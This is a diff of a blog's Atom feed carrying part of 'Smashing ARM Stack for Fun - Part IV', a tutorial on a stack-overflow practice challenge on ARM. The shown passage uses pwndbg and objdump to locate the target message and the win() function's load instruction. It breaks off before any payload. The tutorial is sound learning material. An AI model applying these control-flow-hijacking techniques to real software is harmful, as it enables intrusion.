@@ -1,4 +1,262 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-01-19T03:42:19+01:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Smashing ARM Stack for Fun - Part III</title><link href="/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part III" /><published>2021-01-18T00:00:00+01:00</published><updated>2021-01-18T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III.html">&lt;p&gt;Another fast moving post
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-01-20T04:26:20+01:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Smashing ARM Stack for Fun - Part IV</title><link href="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part IV" /><published>2021-01-19T00:00:00+01:00</published><updated>2021-01-19T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html">&lt;p&gt;This time the goal is to make the program print the message
+&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;code flow successfully changed&quot;&lt;/code&gt;.&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;a-manual-xref&quot;&gt;A manual &lt;code class=&quot;highlighter-rouge&quot;&gt;xref&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;Let’s see where this message is stored:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;code flow successfully changed&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65646f63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/*&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;successfully&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'*/&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x20560&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65646f63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/*&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;successfully&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'*/&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And from where the executable makes a reference to it? In other
+words, where in the code segment this address is stored?&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x10c6c&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x20490&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To summarize the message (and array of chars) is stored at 0x10560
+and the address 0x10560 is stored in 0x10490, 0x10c6c and 0x20490.&lt;/p&gt;
+
+&lt;p&gt;These addresses are the &lt;code class=&quot;highlighter-rouge&quot;&gt;char*&lt;/code&gt; that the program must load into a
+register to do a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s assume that one of those addresses is loaded in a register using an
+instruction like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;???&amp;gt;&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It is a reasonable assumption: the rest of the challenges so far used
+this instruction.&lt;/p&gt;
+
+&lt;p&gt;We don’t know neither which register will be using nor the offset so we
+will have to guess.&lt;/p&gt;
+
+&lt;p&gt;Let’s see what we can find with &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raspberrypi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ldr.*r[0-9], \[pc&quot;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10374&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f000c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10388 &amp;lt;_start+0x34&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10378&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f300c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 1038c &amp;lt;_start+0x38&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10390&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3014&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103ac &amp;lt;call_weak_fn+0x1c&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10394&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f2014&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103b0 &amp;lt;call_weak_fn+0x20&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f301c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103d8 &amp;lt;deregister_tm_clones+0x24&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f001c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103dc &amp;lt;deregister_tm_clones+0x28&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3010&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103e0 &amp;lt;deregister_tm_clones+0x2c&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f1024&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10410 &amp;lt;register_tm_clones+0x2c&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0024&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10414 &amp;lt;register_tm_clones+0x30&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3010&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10418 &amp;lt;register_tm_clones+0x34&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10420&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f4018&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10440 &amp;lt;__do_global_dtors_aux+0x24&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10448&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0024&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10474 &amp;lt;frame_dummy+0x30&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10460&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3010&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10478 &amp;lt;frame_dummy+0x34&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;10484&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0004&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; 10490 &amp;lt;win+0x14&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0018&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 104e8 &amp;lt;main+0x54&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f604c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10548 &amp;lt;__libc_csu_init+0x5c&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f504c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 1054c &amp;lt;__libc_csu_init+0x60&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These two lines are interesting:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;mi&quot;&gt;10484&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0004&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; 10490 &amp;lt;win+0x14&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0018&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 104e8 &amp;lt;main+0x54&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the winner is 0x10484!&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;See how 0x10484 the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ldr&lt;/code&gt; instruction plus the offset
+&lt;code class=&quot;highlighter-rouge&quot;&gt;0x4&lt;/code&gt; plus 0x8 bytes yields an address (0x10490) that we found before, a
+&lt;code class=&quot;highlighter-rouge&quot;&gt;char*&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;If we dereference it we will see the address of the message:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wx&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;       &lt;span class=&quot;mh&quot;&gt;0x00010560&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bs&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00010560&lt;/span&gt;
